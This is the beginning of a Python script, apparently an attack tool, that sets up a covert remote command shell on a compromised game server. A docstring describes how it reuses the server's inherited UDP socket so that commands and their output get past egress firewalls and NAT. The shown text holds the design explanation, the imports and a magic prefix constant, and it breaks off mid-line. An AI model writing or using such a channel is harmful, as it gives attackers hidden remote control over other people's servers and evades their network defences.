#!/usr/bin/env python3
"""Socket-reuse command channel for egress-filtered targets.

Dropped and run by the exploit's system() payload. The server's game socket (0.0.0.0:25565) is NOT
CLOEXEC, so it is inherited as an open fd by anything system() spawns. We reuse that exact socket:

  * no socket() and no connect(), so nothing new has to escape the firewall
  * replies leave as the SAME 4-tuple the inbound game flow already created, which a stateful
    firewall permits (classic findsock / reuse-socket, cf. skape's findsock shellcode and
    Metasploit's reuse/find_tag payloads)

The channel is deliberately dumb: our client sends a magic-prefixed UDP datagram, we recvfrom() it,
run the command, and sendto() the output back to whatever address it came from. That also solves NAT
for free, since we answer the post-NAT source address the kernel reports.

Because the server's own recv loop is competing for datagrams on that socket, we do NOT try to steal
its traffic: we open our own view of the fd and read opportunistically. Datagrams the server consumes
first are simply missed, so the client retries. This is a control channel, not a fast one.
"""
import os, socket, subprocess, sys, time

MAGIC = b"\x00\xffSHLL"          # leading NUL: RakNet treats it as an invalid/unused packet id
F